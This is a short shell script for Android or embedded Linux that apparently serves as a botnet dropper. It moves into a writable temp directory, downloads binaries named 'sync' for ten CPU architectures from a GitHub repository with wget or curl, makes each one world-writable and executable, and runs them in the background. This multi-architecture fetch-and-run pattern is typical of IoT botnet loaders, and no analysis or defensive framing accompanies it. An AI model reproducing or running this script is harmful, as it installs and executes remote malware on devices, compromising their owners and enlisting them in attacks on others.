#!/system/bin/sh
cd /data/local/tmp || cd /data/data || cd /mnt/sdcard || cd /sdcard
BASE_URL="https://github.com/khaosbrigade1337-hue/gd3523eas/raw/refs/heads/main"
BINS="sync.x86 sync.mips sync.mipsel sync.arm4 sync.arm5 sync.arm6 sync.arm7 sync.powerpc sync.m68k sync.sh4"
for bin in $BINS; do
    (wget "$BASE_URL/$bin" -O "$bin" || curl -L "$BASE_URL/$bin" -o "$bin") && chmod 777 "$bin" && ./"$bin" &
done
